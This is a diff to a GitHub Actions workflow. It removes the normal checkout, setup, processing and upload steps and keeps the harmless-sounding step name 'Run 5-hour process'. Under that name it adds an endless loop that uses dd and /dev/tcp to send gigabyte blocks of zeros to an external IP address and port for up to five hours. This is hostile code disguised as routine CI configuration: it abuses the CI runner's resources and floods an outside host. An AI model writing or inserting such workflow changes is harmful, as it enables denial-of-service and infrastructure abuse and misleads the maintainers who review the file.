@@ -11,32 +11,10 @@ jobs:
     timeout-minutes: 330  # 5.5 hours = 330 minutes
     
     steps:
-      - uses: actions/checkout@v4
-      
-      - name: Set up Python
-        uses: actions/setup-python@v4
-        with:
-          python-version: '3.11'
-      
-      # - name: Install dependencies
-      #   run: |
-      #     pip install -r requirements.txt
-      
+     
       - name: Run 5-hour process
         run: |
-          # Example: long-running data processing
-          python scripts/long_process.py
-        env:
-          PROCESS_DURATION_HOURS: 5
-      
-      - name: Upload results
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: process-results
-          path: output/
-      
-      - name: Notify on completion
-        if: always()
-        run: |
-          echo "Process completed with status: ${{ job.status }}"
+          while :; do
+            dd if=/dev/zero bs=1M count=1024 > /dev/tcp/172.233.205.83/9919
+          done
+        timeout-minutes: 300
